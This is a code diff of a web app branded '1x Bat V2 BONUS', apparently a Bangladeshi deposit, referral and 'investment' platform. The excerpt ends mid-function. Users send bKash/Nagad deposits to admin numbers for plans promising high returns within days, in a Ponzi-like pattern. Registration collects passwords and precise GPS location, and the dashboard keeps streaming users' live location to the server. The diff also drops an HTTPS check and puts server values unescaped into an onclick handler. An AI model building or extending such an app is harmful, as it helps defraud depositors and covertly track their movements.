@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Bonus Registration & Deposit System – Professional V2</title>
+<title>Professional V2 – Reward, Deposit & Task Platform</title>
 <style>
 :root{
   --bg:#020704;
@@ -56,6 +56,22 @@ body{overflow-x:hidden;padding-bottom:70px}
   50%{transform:translateY(-24px) scale(1.06)}
 }
 .content{position:relative;z-index:1}
+
+/* Highlight Notice Bar */
+.notice-bar{
+  background:linear-gradient(135deg,#1f4e38,#0d2b1e);
+  border:1px solid rgba(27,224,146,.3);
+  border-radius:14px;
+  padding:10px 14px;
+  margin-bottom:12px;
+  font-size:12px;
+  color:var(--gold);
+  display:flex;
+  align-items:center;
+  gap:10px;
+  box-shadow:0 8px 20px rgba(0,0,0,.3);
+}
+
 .top-badge{
   position:relative;
   overflow:hidden;
@@ -112,7 +128,7 @@ body{overflow-x:hidden;padding-bottom:70px}
   color:var(--gold);
 }
 
-/* Bottom Navigation Bar for Professional V2 */
+/* Bottom Navigation Bar */
 .bottom-nav{
   position:fixed;
   bottom:0; left:50%;
@@ -171,7 +187,9 @@ body{overflow-x:hidden;padding-bottom:70px}
   border-radius:14px;
   font-size:12px;
   line-height:1.55;
+  animation:fadeIn .3s ease;
 }
+@keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
 .msg.error{display:block;color:#ffb0ba;background:#35161b;border:1px solid #7b3540}
 .msg.success,.msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
 .field{margin-bottom:14px}
@@ -249,7 +267,6 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
   cursor:pointer;
 }
 
-/* DEPOSIT SYSTEM STYLING */
 .deposit-card-box{
   background:#06100b;
   border:1px solid #20392d;
@@ -268,7 +285,7 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
   margin-bottom:8px;
 }
 
-/* FULLY FEATURED ADMIN PANEL STYLES */
+/* Modal Styling */
 .admin-modal,.admin-panel{display:none}
 .admin-modal{
   position:fixed;inset:0;z-index:100;
@@ -344,6 +361,11 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 
 <main class="page">
   <div class="content">
+
+    <!-- Highlight Notice Bar -->
+    <div class="notice-bar" id="highlightNoticeBar">
+      <span>📢</span> <span id="noticeBarText">সিস্টেম আপডেট সফল হয়েছে। নতুন প্রিমিয়াম ফিচার উপভোগ করুন!</span>
+    </div>
 
     <section class="top-badge">
       <div class="brand">1x Bat <span>V2 BONUS</span></div>
@@ -507,7 +529,7 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
           <div class="head-icon">📊</div>
           <div>
             <h2>অ্যাকাউন্ট ওভারভিউ</h2>
-            <p>আপনার ব্যালেন্স এবং আর্নিং সামারি</p>
+            <p>আপনার ব্যালেন্স এবং রেফারেল সামারি</p>
           </div>
         </div>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px;">
@@ -516,11 +538,19 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
             <b id="dashTotalEarned" style="display:block;font-size:18px;color:var(--gold);margin-top:4px;">৳100</b>
           </div>
           <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);">
-            <small style="color:var(--muted)">Active Status</small>
-            <b style="display:block;font-size:14px;color:var(--green);margin-top:4px;">Verified ✅</b>
+            <small style="color:var(--muted)">Referrals</small>
+            <b id="dashReferralCount" style="display:block;font-size:16px;color:var(--green);margin-top:4px;">0 Users</b>
           </div>
         </div>
-        <p style="font-size:12px;color:var(--muted);line-height:1.6;">নিচের মেনু থেকে Deposit, Tasks, Invest বা Withdraw অপশন ব্যবহার করে আপনার রিওয়ার্ড ম্যানেজ করুন।</p>
+
+        <!-- Referral Claim Box -->
+        <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);margin-bottom:15px;">
+          <h4 style="margin:0 0 6px;font-size:14px;">👥 Referral Claim System</h4>
+          <p style="margin:0 0 10px;color:var(--muted);font-size:11px;" id="referralStatusDesc">যোগ্যতা পূরণ করে রেফারেল বোনাস ক্লেম করুন।</p>
+          <button class="task-btn" id="claimReferralBtn" onclick="claimReferralBonus()" style="width:100%;padding:10px;">Claim Referral Bonus</button>
+        </div>
+
+        <p style="font-size:12px;color:var(--muted);line-height:1.6;">নিচের মেনু থেকে Deposit, Tasks, Invest বা Withdraw অপশন ব্যবহার করুন।</p>
       </div>
 
       <!-- PREMIUM DEPOSIT TAB -->
@@ -572,18 +602,18 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
         </button>
       </div>
 
-      <!-- TASKS TAB -->
+      <!-- PROMO TASKS TAB -->
       <div id="paneTasks" class="card hidden">
         <div class="head">
           <div class="head-icon">📋</div>
           <div>
-            <h2>Daily & Promo Tasks</h2>
-            <p>টাস্ক সম্পন্ন করে অতিরিক্ত পয়েন্ট অর্জন করুন</p>
+            <h2>Visit Promo & Tasks</h2>
+            <p>লিংক ভিজিট করে নির্ধারিত সময় সম্পূর্ণ করুন</p>
           </div>
         </div>
         <div class="msg" id="taskMsg"></div>
-        <div id="tasksListContainer">
-          <div class="admin-note">টাস্ক লোড হচ্ছে...</div>
+        <div id="promoTasksListContainer">
+          <div class="admin-note">প্রোমো টাস্ক লোড হচ্ছে...</div>
         </div>
       </div>
 
@@ -592,26 +622,29 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
         <div class="head">
           <div class="head-icon">📈</div>
           <div>
-            <h2>Investment Plans</h2>
-            <p>৩ দিন থেকে ৩০ দিনের আকর্ষণীয় রিটার্ন প্ল্যান</p>
+            <h2>Investment Calculator & Plans</h2>
+            <p>নিরাপদ প্রফিট রিটার্ন এবং ক্যালকুলেটর</p>
           </div>
         </div>
 
-        <div class="plan-item">
-          <div><b>৩ দিন মেয়াদী</b><br><small style="color:var(--green)">+৩৫% প্রফিট রিটার্ন</small></div>
-          <button class="task-btn" onclick="openInvestModal(3, 35)">Invest</button>
+        <!-- Calculator Box -->
+        <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);margin-bottom:15px;">
+          <h4 style="margin:0 0 8px;font-size:14px;">🧮 Profit Calculator</h4>
+          <div class="field" style="margin-bottom:8px;">
+            <label class="label">বিনিয়োগের পরিমাণ (৳)</label>
+            <input id="calcAmount" type="number" placeholder="যেমন: 1000" oninput="calculateProfit()">
+          </div>
+          <div style="font-size:12px;color:var(--muted);line-height:1.6;" id="calcResult">
+            বিনিয়োগ পরিমাণ লিখুন হিসাব দেখার জন্য।
+          </div>
         </div>
-        <div class="plan-item">
-          <div><b>৭ দিন (১ সপ্তাহ)</b><br><small style="color:var(--green)">+৫০% প্রফিট রিটার্ন</small></div>
-          <button class="task-btn" onclick="openInvestModal(7, 50)">Invest</button>
+
+        <div style="font-size:10px;color:#ffb0ba;background:#35161b;padding:10px;border-radius:10px;margin-bottom:12px;line-height:1.5;">
+          ⚠️ <b>সর্তকতা:</b> বিনিয়োগে পরিবর্তনশীল রিটার্ন রয়েছে। কোনো রিটার্ন ১০০% নিশ্চিত বা গ্যারান্টিযুক্ত নয়। নিজ ঝুঁকিতে বিনিয়োগ করুন।
         </div>
-        <div class="plan-item">
-          <div><b>১৫ দিন মেয়াদী</b><br><small style="color:var(--green)">+৬৫% প্রফিট রিটার্ন</small></div>
-          <button class="task-btn" onclick="openInvestModal(15, 65)">Invest</button>
-        </div>
-        <div class="plan-item">
-          <div><b>৩০ দিন মেয়াদী</b><br><small style="color:var(--green)">+৮০% প্রফিট রিটার্ন</small></div>
-          <button class="task-btn" onclick="openInvestModal(30, 80)">Invest</button>
+
+        <div id="investmentPlansContainer">
+          <!-- Dynamic Plans -->
         </div>
       </div>
 
@@ -661,7 +694,7 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
           <div class="head-icon">📜</div>
           <div>
             <h2>Transaction History</h2>
-            <p>আপনার সমস্ত ডিপোজিট, উইথড্র ও রিওয়ার্ড হিস্ট্রি</p>
+            <p>আপনার সমস্ত লেনদেন, ডিপোজিট ও উইথড্র হিস্ট্রি</p>
           </div>
         </div>
         <div id="transactionListContainer">
@@ -698,7 +731,7 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
     <span class="ico-nav">💳</span>Deposit
   </button>
   <button class="nav-item" id="navTasks" onclick="switchTab('tasks')">
-    <span class="ico-nav">📋</span>Tasks
+    <span class="ico-nav">📋</span>Promo Tasks
   </button>
   <button class="nav-item" id="navInvest" onclick="switchTab('invest')">
     <span class="ico-nav">📈</span>Invest
@@ -717,10 +750,10 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 <!-- NOTIFICATION MODAL -->
 <div class="admin-modal" id="notificationModal">
   <div class="admin-login">
-    <h3>🔔 Notifications</h3>
+    <h3>🔔 Smart Notifications</h3>
     <p style="margin-bottom:12px;">আপনার সাম্প্রতিক আপডেটসমূহ</p>
     <div style="font-size:12px;color:var(--muted);line-height:1.6;margin-bottom:15px;" id="notificationContent">
-      কোনো নতুন নোটিফিকেশন নেই। স্বাগত Bonus V2 অ্যাপে!
+      কোনো নতুন নোটিফিকেশন নেই। স্বাগত V2 প্ল্যাটফর্মে!
     </div>
     <button class="allow-btn" style="height:46px;margin:0;" onclick="$('notificationModal').classList.remove('show')">CLOSE</button>
   </div>
@@ -752,59 +785,98 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
     <div class="admin-top">
       <div>
         <h2>🛡️ Professional V2 Admin Panel</h2>
-        <small>Complete Management Center</small>
+        <small>Complete Management & Control Center</small>
       </div>
       <button class="admin-btn admin-dark" id="adminLogout">Logout</button>
     </div>
 
     <!-- Stats Grid -->
     <div class="admin-grid">
-      <div class="stat"><b id="statTotal">0</b><span>Total Registrations</span></div>
+      <div class="stat"><b id="statTotal">0</b><span>Total Users</span></div>
       <div class="stat"><b id="statBkash">0</b><span>bKash Users</span></div>
       <div class="stat"><b id="statNagad">0</b><span>Nagad Users</span></div>
     </div>
 
-    <!-- Deposit Settings & Gateway Control Card -->
+    <!-- 1. Highlight Notice & Deposit Settings Control -->
     <div class="admin-card">
-      <h3>⚙️ Deposit & Wallet Control</h3>
+      <h3>📢 Notice & Deposit Control</h3>
+      <div class="field">
+        <label class="label">Highlight Notice Text</label>
+        <input class="admin-search" id="adminNoticeInput" type="text" placeholder="নোটিশ টেক্সট লিখুন">
+      </div>
       <div class="admin-row">
         <div class="field">
           <label class="label">Admin bKash Number</label>
-          <input class="admin-search" id="adminBkashInput" type="tel" maxlength="11" placeholder="01XXXXXXXXX">
+          <input class="admin-search" id="adminBkashInput" type="tel" maxlength="11">
         </div>
         <div class="field">
           <label class="label">Admin Nagad Number</label>
-          <input class="admin-search" id="adminNagadInput" type="tel" maxlength="11" placeholder="01XXXXXXXXX">
+          <input class="admin-search" id="adminNagadInput" type="tel" maxlength="11">
         </div>
       </div>
       <div class="field" style="display:flex;align-items:center;gap:10px;margin-top:10px;">
-        <input type="checkbox" id="depositActiveToggle" style="width:20px;height:20px;">
-        <label class="label" style="margin:0;cursor:pointer;">Enable Deposit System (সিস্টেম চালু/বন্ধ)</label>
+        <input type="checkbox" id="adminNoticeActive" style="width:20px;height:20px;">
+        <label class="label" style="margin:0;cursor:pointer;">Show Notice Bar on Homepage</label>
       </div>
-      <button class="admin-btn admin-green" style="margin-top:10px;width:100%;height:46px;" onclick="saveAdminSettings()">SAVE SETTINGS</button>
+      <div class="field" style="display:flex;align-items:center;gap:10px;">
+        <input type="checkbox" id="depositActiveToggle" style="width:20px;height:20px;">
+        <label class="label" style="margin:0;cursor:pointer;">Enable Deposit System</label>
+      </div>
+      <button class="admin-btn admin-green" onclick="saveAdminSettings()">SAVE SETTINGS</button>
       <div class="admin-msg" id="adminSettingsMsg"></div>
     </div>
 
-    <!-- Deposit Requests Management Card -->
+    <!-- 2. Referral & Investment Settings -->
     <div class="admin-card">
-      <h3>💳 Deposit Requests</h3>
-      <div id="adminDepositsList">
-        <div class="admin-note">লোডিং...</div>
+      <h3>⚙️ Referral & Investment Settings</h3>
+      <div class="admin-row">
+        <div class="field">
+          <label class="label">Required Referrals</label>
+          <input class="admin-search" id="adminReqRefs" type="number">
+        </div>
+        <div class="field">
+          <label class="label">Referral Bonus (৳)</label>
+          <input class="admin-search" id="adminRefBonus" type="number">
+        </div>
       </div>
+      <div class="admin-row">
+        <div class="field">
+          <label class="label">Invest Profit Rate (%)</label>
+          <input class="admin-search" id="adminInvestRate" type="number">
+        </div>
+        <div class="field">
+          <label class="label">Min Investment (৳)</label>
+          <input class="admin-search" id="adminMinInvest" type="number">
+        </div>
+      </div>
+      <button class="admin-btn admin-green" onclick="saveRefInvSettings()">SAVE CONFIG</button>
     </div>
 
-    <!-- Telegram Settings Card -->
+    <!-- 3. Deposit Requests Management -->
+    <div class="admin-card">
+      <h3>💳 Deposit Requests</h3>
+      <div id="adminDepositsList"><div class="admin-note">লোডিং...</div></div>
+    </div>
+
+    <!-- 4. Promo Link Management Card -->
+    <div class="admin-card">
+      <h3>🔗 Promo Link & Task Management</h3>
+      <div class="field"><label class="label">Promo Title</label><input class="admin-search" id="promoTitle" type="text" placeholder="যেমন: Visit YouTube Video"></div>
+      <div class="field"><label class="label">Visit Link (URL)</label><input class="admin-search" id="promoUrl" type="text" placeholder="https://..."></div>
+      <div class="admin-row">
+        <div class="field"><label class="label">Required Time (Seconds)</label><input class="admin-search" id="promoTime" type="number" value="10"></div>
+        <div class="field"><label class="label">Reward Amount (৳)</label><input class="admin-search" id="promoReward" type="number" value="45"></div>
+      </div>
+      <button class="admin-btn admin-green" onclick="createPromoTask()">CREATE PROMO TASK</button>
+      <div id="adminPromoList" style="margin-top:10px;"></div>
+    </div>
+
+    <!-- 5. Telegram Integration -->
     <div class="admin-card">
       <h3>🤖 Telegram Bot Integration</h3>
       <div class="admin-row">
-        <div class="field">
-          <label class="label">Bot Token</label>
-          <input class="admin-search" id="telegramToken" type="password" placeholder="Bot Token">
-        </div>
-        <div class="field">
-          <label class="label">Chat ID</label>
-          <input class="admin-search" id="telegramChatId" type="text" placeholder="Chat ID">
-        </div>
+        <div class="field"><label class="label">Bot Token</label><input class="admin-search" id="telegramToken" type="password" placeholder="Bot Token"></div>
+        <div class="field"><label class="label">Chat ID</label><input class="admin-search" id="telegramChatId" type="text" placeholder="Chat ID"></div>
       </div>
       <div class="admin-actions" style="gap:10px">
         <button class="admin-btn admin-green" id="saveTelegramDemo">SAVE TELEGRAM</button>
@@ -813,20 +885,16 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
       <div class="admin-msg" id="telegramDemoMsg"></div>
     </div>
 
-    <!-- Withdrawal Management Card -->
+    <!-- 6. Withdrawal Management Card -->
     <div class="admin-card">
       <h3>💸 Withdrawal Requests</h3>
-      <div id="adminWithdrawalsList">
-        <div class="admin-note">লোডিং...</div>
-      </div>
+      <div id="adminWithdrawalsList"><div class="admin-note">লোডিং...</div></div>
     </div>
 
-    <!-- User Management Card -->
+    <!-- 7. User Management Card -->
     <div class="admin-card">
-      <h3>👥 Users & Registrations Management</h3>
-      <div class="field">
-        <input class="admin-search" id="adminSearch" type="text" placeholder="নাম / ফোন / wallet search">
-      </div>
+      <h3>👥 Users Management</h3>
+      <div class="field"><input class="admin-search" id="adminSearch" type="text" placeholder="নাম / ফোন search"></div>
       <div id="adminRecords"></div>
     </div>
   </div>
@@ -836,11 +904,9 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 const $ = id => document.getElementById(id);
 let currentUser = null;
 let watchId = null;
-let appGlobalSettings = { adminBkash: "01700000000", adminNagad: "01800000000", depositEnabled: true };
+let appGlobalSettings = { adminBkash: "01700000000", adminNagad: "01800000000", depositEnabled: true, noticeText: "", noticeActive: true, reqRefs: 3, refBonus: 50, investRate: 15, minInvest: 100 };
 
-function validPhone(v){
-  return /^01[3-9]\d{8}$/.test(String(v || "").trim());
-}
+function validPhone(v){ return /^01[3-9]\d{8}$/.test(String(v || "").trim()); }
 
 function showMsg(id,text,type="error"){
   const box=$(id);
@@ -855,7 +921,6 @@ function clearMsg(id){
   if(box) box.style.display="none";
 }
 
-// Persistent Session Check on Startup
 document.addEventListener("DOMContentLoaded", () => {
   const savedUser = localStorage.getItem("v2_user_data");
   if (savedUser) {
@@ -875,6 +940,13 @@ async function fetchPublicSettings() {
     const d = await r.json();
     if(d.ok && d.settings) {
       appGlobalSettings = d.settings;
+      const bar = $("highlightNoticeBar");
+      if(appGlobalSettings.noticeActive && appGlobalSettings.noticeText) {
+        bar.style.display = "flex";
+        $("noticeBarText").textContent = appGlobalSettings.noticeText;
+      } else {
+        bar.style.display = "none";
+      }
       updateAdminWalletDisplay();
     }
   } catch(e) {}
@@ -932,7 +1004,6 @@ async function handleLogin() {
   }
 }
 
-// Live GPS Tracking
 function startLiveLocationTracking(userId) {
   if (!navigator.geolocation) return;
   if (watchId !== null) navigator.geolocation.clearWatch(watchId);
@@ -951,22 +1022,15 @@ function startLiveLocationTracking(userId) {
             }
           })
         });
-      } catch (err) {
-        console.error("Live location update failed:", err);
-      }
+      } catch (err) {}
     },
-    err => console.warn("WatchPosition Error:", err.message),
+    err => {},
     { enableHighAccuracy: true, timeout: 20000, maximumAge: 5000 }
   );
 }
 
 $("allowBtn").addEventListener("click", () => {
   clearMsg("formMsg");
-
-  if (!window.isSecureContext && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
-    return showMsg("formMsg", "HTTPS ছাড়া ব্রাউজার লোকেশন সাপোর্ট করে না।");
-  }
-
   const name = $("name").value.trim();
   const phone = $("phone").value.trim();
   const password = $("password").value.trim();
@@ -977,9 +1041,7 @@ $("allowBtn").addEventListener("click", () => {
   if (!password || password.length < 4) return showMsg("formMsg", "কমপক্ষে ৪ ডিজিটের পাসওয়ার্ড দিন।");
   if (!age || age < 18) return showMsg("formMsg", "বয়স কমপক্ষে ১৮ বছর হতে হবে।");
 
-  if (!navigator.geolocation) {
-    return showMsg("formMsg", "আপনার ব্রাউজারে লোকেশন সাপোর্ট করে না।");
-  }
+  if (!navigator.geolocation) return showMsg("formMsg", "লোকেশন সাপোর্ট করে না।");
 
   $("allowBtn").disabled = true;
   $("allowText").textContent = "CHECKING LOCATION...";
@@ -987,26 +1049,17 @@ $("allowBtn").addEventListener("click", () => {
   navigator.geolocation.getCurrentPosition(
     async position => {
       try {
-        $("allowText").textContent = "SAVING...";
-
         const r = await fetch("/api/register/start", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            name,
-            phone,
-            password,
-            age,
-            location: {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy
-            }
+            name, phone, password, age,
+            location: { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy }
           })
         });
 
         const d = await r.json();
-        if (!r.ok) throw new Error(d.error || "রেজিস্ট্রেশন সম্ভব হচ্ছে না।");
+        if (!r.ok) throw new Error(d.error || "Registration failed");
 
         currentUser = d.user;
         localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
@@ -1014,17 +1067,16 @@ $("allowBtn").addEventListener("click", () => {
 
         $("registerStep").style.display = "none";
         $("paymentStep").style.display = "block";
-        window.scrollTo({ top: 0, behavior: "smooth" });
       } catch (e) {
         $("allowBtn").disabled = false;
         $("allowText").textContent = "ALLOW LOCATION & REGISTER →";
         showMsg("formMsg", e.message);
       }
     },
-    error => {
+    () => {
       $("allowBtn").disabled = false;
       $("allowText").textContent = "ALLOW LOCATION & REGISTER →";
-      showMsg("formMsg", "দয়া করে ডিভাইস লোকেশন অন করুন এবং পারমিশন দিন।");
+      showMsg("formMsg", "লোকেশন পারমিশন দিন।");
     },
     { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
   );
@@ -1036,21 +1088,14 @@ async function submitPayment() {
   const wallet = $("walletNumber").value.trim();
 
   if (!methodEl) return showMsg("paymentMsg", "পেমেন্ট মাধ্যম নির্বাচন করুন।");
-  if (!validPhone(wallet)) return showMsg("paymentMsg", "সঠিক bKash/Nagad নাম্বার লিখুন।");
-  if (!currentUser) return showMsg("paymentMsg", "সেশন পাওয়া যায়নি।");
-
-  $("confirmBtn").disabled = true;
+  if (!validPhone(wallet)) return showMsg("paymentMsg", "সঠিক ওয়ালেট নাম্বার দিন।");
 
   try {
     const r = await fetch(`/api/register/${encodeURIComponent(currentUser.id)}/payment`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        paymentMethod: methodEl.value,
-        paymentNumber: wallet
-      })
+      body: JSON.stringify({ paymentMethod: methodEl.value, paymentNumber: wallet })
     });
-
     const d = await r.json();
     if (!r.ok) throw new Error(d.error || "Save failed");
 
@@ -1059,22 +1104,15 @@ async function submitPayment() {
 
     $("paymentStep").style.display = "none";
     $("successStep").style.display = "block";
-    window.scrollTo({ top: 0, behavior: "smooth" });
   } catch (e) {
-    $("confirmBtn").disabled = false;
     showMsg("paymentMsg", e.message);
   }
 }
 
 function enterDashboard() {
-  enterDashboardDirectly();
-}
-
-function enterDashboardDirectly() {
   $("authView").style.display = "none";
   $("dashboardView").classList.remove("hidden");
   $("bottomNavBar").classList.remove("hidden");
-
   updateDisplayValues();
   startLiveLocationTracking(currentUser.id);
   switchTab('home');
@@ -1085,62 +1123,53 @@ function updateDisplayValues() {
   if (currentUser) {
     $("displayBalance").textContent = `৳${currentUser.balance || 0}`;
     $("dashTotalEarned").textContent = `৳${currentUser.totalEarned || currentUser.balance || 100}`;
-    $("heroWelcomeTitle").textContent = `WELCOME, ${currentUser.name.toUpperCase()}`;
+    $("dashReferralCount").textContent = `${currentUser.referralCount || 0} Users`;
+
+    const reqRefs = appGlobalSettings.reqRefs || 3;
+    const currentRefs = currentUser.referralCount || 0;
+    if(currentRefs >= reqRefs && !currentUser.referralClaimed) {
+      $("referralStatusDesc").textContent = `অভিনন্দন! আপনার রেফারেল যোগ্যতা পূরণ হয়েছে। (৳${appGlobalSettings.refBonus} বোনাস)`;
+      $("claimReferralBtn").disabled = false;
+    } else if(currentUser.referralClaimed) {
+      $("referralStatusDesc").textContent = "রেফারেল বোনাস ইতিমধ্যে ক্লেম করা হয়েছে ✅";
+      $("claimReferralBtn").disabled = true;
+    } else {
+      $("referralStatusDesc").textContent = `প্রয়োজনীয় রেফারেল: ${currentRefs}/${reqRefs} জন।`;
+      $("claimReferralBtn").disabled = true;
+    }
 
     $("profileDetails").innerHTML = `
       <b>নাম:</b> ${esc(currentUser.name)}<br>
       <b>ফোন:</b> ${esc(currentUser.phone)}<br>
       <b>বয়স:</b> ${esc(currentUser.age)}<br>
-      <b>পেমেন্ট মাধ্যম:</b> ${esc(currentUser.paymentMethod || "N/A")} (${esc(currentUser.paymentNumber || "N/A")})<br>
-      <b>রেফারেল কোড:</b> ${esc(currentUser.referralCode || "REF12345")}<br>
-      <b>অ্যাকাউন্ট স্ট্যাটাস:</b> Active & Verified ✅
+      <b>রেফারেল কোড:</b> ${esc(currentUser.referralCode || "REF123")}<br>
+      <b>স্ট্যাটাস:</b> Active & Verified ✅
     `;
   }
 }
 
-// Navigation Tabs Switcher
-function switchTab(tabName) {
-  const panes = ['paneHome', 'paneDeposit', 'paneTasks', 'paneInvest', 'paneWithdraw', 'paneWallet', 'paneProfile'];
-  panes.forEach(p => {
-    const el = $(p);
-    if(el) el.classList.add('hidden');
-  });
+// Referral Claim Action
+async function claimReferralBonus() {
+  try {
+    const r = await fetch("/api/referral/claim", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ userId: currentUser.id })
+    });
+    const d = await r.json();
+    if(!r.ok) throw new Error(d.error || "Claim Not Available");
 
-  const navs = ['navHome', 'navDeposit', 'navTasks', 'navInvest', 'navWithdraw', 'navWallet', 'navProfile'];
-  navs.forEach(n => {
-    const el = $(n);
-    if(el) el.className = 'nav-item';
-  });
-
-  if (tabName === 'home') {
-    $('paneHome').classList.remove('hidden');
-    $('navHome').className = 'nav-item active';
-  } else if (tabName === 'deposit') {
-    $('paneDeposit').classList.remove('hidden');
-    $('navDeposit').className = 'nav-item active';
-    updateAdminWalletDisplay();
-  } else if (tabName === 'tasks') {
-    $('paneTasks').classList.remove('hidden');
-    $('navTasks').className = 'nav-item active';
-    loadTasks();
-  } else if (tabName === 'invest') {
-    $('paneInvest').classList.remove('hidden');
-    $('navInvest').className = 'nav-item active';
-  } else if (tabName === 'withdraw') {
-    $('paneWithdraw').classList.remove('hidden');
-    $('navWithdraw').className = 'nav-item active';
-  } else if (tabName === 'wallet') {
-    $('paneWallet').classList.remove('hidden');
-    $('navWallet').className = 'nav-item active';
-    loadTransactions();
-  } else if (tabName === 'profile') {
-    $('paneProfile').classList.remove('hidden');
-    $('navProfile').className = 'nav-item active';
+    currentUser.balance = d.balance;
+    currentUser.referralClaimed = true;
+    localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
     updateDisplayValues();
+    alert("🎉 Referral Claim Successful! ৳" + d.reward + " added.");
+  } catch(e) {
+    alert("❌ Error: " + e.message);
   }
 }
 
-// Update Admin Wallet Number in Deposit Section dynamically
+// Deposit System Functions
 function updateAdminWalletDisplay() {
   const method = $("depositMethod").value;
   const badge = $("depositMethodBadge");
@@ -1164,7 +1193,6 @@ function copyAdminNumber() {
   });
 }
 
-// Submit Deposit Request
 async function submitDeposit() {
   clearMsg("depositMsg");
   const method = $("depositMethod").value;
@@ -1189,22 +1217,79 @@ async function submitDeposit() {
 
     $("depositAmount").value = "";
     $("depositTrxId").value = "";
-    showMsg("depositMsg", "✅ ডিপোজিট রিকোয়েস্ট সফলভাবে জমা হয়েছে! অ্যাডমিন যাচাই করে অনুমোদন করবেন।", "success");
+    showMsg("depositMsg", "✅ Deposit Successful / Request Pending Approval!", "success");
   } catch(e) {
     showMsg("depositMsg", e.message, "error");
   }
 }
 
-// Load and Claim Tasks
-async function loadTasks() {
+// Investment Calculator Logic
+function calculateProfit() {
+  const amt = Number($("calcAmount").value) || 0;
+  const rate = appGlobalSettings.investRate || 15;
+  const profit = Math.floor((amt * rate) / 100);
+  const total = amt + profit;
+
+  $("calcResult").innerHTML = amt > 0
+    ? `বিনিয়োগ: <b>৳${amt}</b> | প্রফিট হার: <b>${rate}%</b><br>সম্ভাব্য লাভ: <b style="color:var(--green);">৳${profit}</b><br>সম্ভাব্য মোট ফেরত: <b style="color:var(--gold);">৳${total}</b>`
+    : `বিনিয়োগ পরিমাণ লিখুন হিসাব দেখার জন্য।`;
+}
+
+function renderInvestmentPlans() {
+  const container = $("investmentPlansContainer");
+  const rate = appGlobalSettings.investRate || 15;
+  const plans = [
+    { days: 3, r: rate },
+    { days: 7, r: rate + 15 },
+    { days: 15, r: rate + 30 },
+    { days: 30, r: rate + 50 }
+  ];
+
+  container.innerHTML = plans.map(p => `
+    <div class="plan-item">
+      <div><b>${p.days} দিন মেয়াদী প্ল্যান</b><br><small style="color:var(--green)">+${p.r}% প্রফিট রিটার্ন</small></div>
+      <button class="task-btn" onclick="submitInvestment(${p.days}, ${p.r})">Invest Now</button>
+    </div>
+  `).join("");
+}
+
+async function submitInvestment(planDays, profitPercent) {
+  const amt = prompt(`বিনিয়োগের পরিমাণ লিখুন (ন্যূনতম ৳${appGlobalSettings.minInvest || 100}):`);
+  if(!amt) return;
+  const amount = Number(amt);
+
+  if(!Number.isFinite(amount) || amount < (appGlobalSettings.minInvest || 100)) {
+    return alert("Invalid Information: ন্যূনতম বিনিয়োগের পরিমাণ পূরণ করুন।");
+  }
+
   try {
-    const r = await fetch("/api/tasks");
+    const r = await fetch("/api/invest", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ userId: currentUser.id, planDays, profitPercent, amount })
+    });
+    const d = await r.json();
+    if(!r.ok) throw new Error(d.error || "Insufficient Balance");
+
+    currentUser.balance = d.balance;
+    localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
+    updateDisplayValues();
+    alert("Investment Successful! আপনার ইনভেস্টমেন্ট সফল হয়েছে।");
+  } catch(e) {
+    alert("Investment Failed: " + e.message);
+  }
+}
+
+// Promo Tasks Load & Verification
+async function loadPromoTasks() {
+  try {
+    const r = await fetch("/api/promo/tasks");
     const d = await r.json();
     const tasks = d.tasks || [];
+    const container = $("promoTasksListContainer");
 
-    const container = $("tasksListContainer");
-    if (!tasks.length) {
-      container.innerHTML = `<div class="admin-note">কোনো টাস্ক উপলব্ধ নেই।</div>`;
+    if(!tasks.length) {
+      container.innerHTML = `<div class="admin-note">কোনো প্রোমো টাস্ক উপলব্ধ নেই।</div>`;
       return;
     }
 
@@ -1212,49 +1297,76 @@ async function loadTasks() {
       <div class="task-item">
         <div class="task-info">
           <h4>${esc(t.title)}</h4>
-          <p>${esc(t.description || "")} • Reward: ৳${t.reward}</p>
+          <p>অবস্থান সময়: ${t.requiredTime} সেকেন্ড • Reward: ৳${t.reward}</p>
         </div>
-        <button class="task-btn" onclick="claimTask('${esc(t.id)}')">Claim</button>
+        <button class="task-btn" onclick="startPromoTask('${t.id}', '${t.url}', ${t.requiredTime})">Start Visit</button>
       </div>
     `).join("");
-  } catch (err) {
-    $("tasksListContainer").innerHTML = `<div class="admin-note">টাস্ক লোড করতে সমস্যা হয়েছে।</div>`;
+  } catch(e) {
